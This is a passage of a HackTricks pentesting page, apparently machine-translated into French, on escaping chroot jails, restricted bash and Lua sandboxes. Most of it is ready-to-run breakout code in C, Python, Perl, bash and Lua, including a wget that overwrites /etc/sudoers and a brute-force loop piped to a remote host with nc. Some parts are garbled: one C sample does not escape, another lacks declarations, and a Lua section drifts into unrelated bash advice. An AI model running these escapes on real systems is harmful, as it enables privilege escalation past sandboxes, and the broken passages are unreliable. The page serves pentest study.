```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        exit(1);
    }

    if (chroot(argv[1]) != 0) {
        perror("chroot");
        exit(1);
    }

    if (chdir("/") != 0) {
        perror("chdir");
        exit(1);
    }

    system("/bin/bash");
    return 0;
}
```

</details>

```bash
gcc break_chroot.c -o break_chroot
./break_chroot /new_chroot
```

### Root + Mount

If you are **root** inside a chroot you **can escape** creating a **mount**. This because **mounts are not affected** by chroot.

```bash
mkdir /tmp/new_root
mount --bind / /tmp/new_root
chroot /tmp/new_root
```

### User + CWD

If you are **not root** inside a chroot you **can escape** creating a **new chroot** with a **new user namespace**. This because **user namespaces** are not affected by chroot.

```bash
unshare --user --map-root-user
mkdir /tmp/new_chroot
chroot /tmp/new_chroot
```

## Limited Bash

If you have a **limited bash** (e.g. `rbash`) you can try to **escape** from it.

### Escaping from rbash

If you have a **limited bash** (e.g. `rbash`) you can try to **escape** from it.

#### Escaping with Bash Variables

```bash
env -i X='() { (a)=>\' bash -c "echo date"; cat echo
```

#### Escaping with Bash Functions

```bash
function echo() { /bin/bash; }
export -f echo
echo date
```

#### Escaping with Bash Builtins

```bash
enable -a
```
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>

Python

</details>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Perl est un langage de programmation interprété, multiplateforme et open source. Il est souvent utilisé pour l'automatisation de tâches système et la manipulation de fichiers. Perl est également utilisé dans le développement web pour la création de scripts CGI et la manipulation de données. Il est souvent utilisé pour l'exploitation de vulnérabilités de type injection de commandes.
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + FD enregistré

{% hint style="warning" %}
Ceci est similaire au cas précédent, mais dans ce cas, l'attaquant **enregistre un descripteur de fichier** vers le répertoire courant, puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD à l'extérieur** du chroot, il y accède et **s'échappe**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("tmpdir", 0755);
    dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
}
```
</details>

### Racine + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD peut être transmis via Unix Domain Sockets, donc :

* Créer un processus enfant (fork)
* Créer UDS pour que le parent et l'enfant puissent communiquer
* Exécuter chroot dans le processus enfant dans un dossier différent
* Dans le processus parent, créer un FD d'un dossier qui se trouve en dehors du nouveau chroot du processus enfant
* Passer à l'enfant ce FD en utilisant l'UDS
* Le processus enfant chdir vers ce FD, et parce qu'il est en dehors de son chroot, il s'échappera de la prison
{% endhint %}

### &#x20;Racine + Montage

{% hint style="warning" %}
* Monter le périphérique racine (/) dans un répertoire à l'intérieur du chroot
* Chrooter dans ce répertoire

Ceci est possible sous Linux
{% endhint %}

### Racine + /proc

{% hint style="warning" %}
* Monter procfs dans un répertoire à l'intérieur du chroot (si ce n'est pas déjà fait)
* Rechercher un pid qui a une entrée racine/cwd différente, comme : /proc/1/root
* Chrooter dans cette entrée
{% endhint %}

### Racine(?) + Fork

{% hint style="warning" %}
* Créer un Fork (processus enfant) et chrooter dans un dossier différent plus profondément dans le FS et CD dessus
* À partir du processus parent, déplacer le dossier où se trouve le processus enfant dans un dossier précédent le chroot des enfants
* Ce processus enfant se retrouvera à l'extérieur du chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Il y a quelque temps, les utilisateurs pouvaient déboguer leurs propres processus à partir d'un processus de lui-même... mais cela n'est plus possible par défaut
* Quoi qu'il en soit, s'il est possible, vous pouvez ptrace dans un processus et exécuter un shellcode à l'intérieur de celui-ci ([voir cet exemple](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Jails Bash

### Énumération

Obtenir des informations sur la prison :
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d'environnement PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utilisation de vim
```bash
:set shell=/bin/sh
:shell
```
### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable avec _/bin/bash_ comme contenu.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash depuis SSH

Si vous accédez via ssh, vous pouvez utiliser cette astuce pour exécuter un shell bash :
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Déclaration
```bash
declare -n PATH; export PATH=/bin;bash -i
 
BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Vous pouvez écraser, par exemple, le fichier sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Autres astuces

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/)\
**La page suivante pourrait également être intéressante:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Jails Python

Astuces pour s'échapper des jails Python sur la page suivante:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Jails Lua

Sur cette page, vous pouvez trouver les fonctions globales auxquelles vous avez accès dans Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval avec exécution de commande:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Quelques astuces pour **appeler des fonctions d'une bibliothèque sans utiliser de points**:

- Utilisez la commande `source` pour charger la bibliothèque dans l'environnement actuel. Ensuite, vous pouvez appeler les fonctions de la bibliothèque directement sans utiliser de points.

- Utilisez la commande `eval` pour exécuter une chaîne de caractères qui contient le nom de la fonction et ses arguments. Par exemple: `eval "nom_de_la_fonction argument1 argument2"`

- Utilisez la commande `alias` pour créer un alias pour la fonction de la bibliothèque. Par exemple: `alias nom_alias="source chemin_vers_la_bibliothèque; nom_de_la_fonction"`

Ces astuces peuvent être utiles pour contourner les restrictions de shell limité ou pour exécuter des fonctions de bibliothèques sans avoir à taper le nom complet de la bibliothèque à chaque fois.
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
# Énumérer les fonctions d'une bibliothèque :

Pour énumérer les fonctions d'une bibliothèque, vous pouvez utiliser la commande `nm`. Cette commande affiche les symboles (y compris les fonctions) d'un fichier objet ou d'une bibliothèque partagée.

Syntaxe :

```bash
nm <library>
```

Exemple :

```bash
nm /usr/lib/x86_64-linux-gnu/libc.a
```

Cela affichera toutes les fonctions de la bibliothèque `libc.a`.
```bash
for k,v in pairs(string) do print(k,v) end
```
Notez que chaque fois que vous exécutez la ligne de commande précédente dans un **environnement lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par force brute en chargeant différents environnements lua et en appelant la première fonction de la bibliothèque "le".
```bash
#In this scenario you could BF the victim that is generating a new lua environment 
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un shell lua interactif**: Si vous êtes dans un shell lua limité, vous pouvez obtenir un nouveau shell lua (et espérons-le, illimité) en appelant:
```bash
debug.debug()
```
## Références

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositives : [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
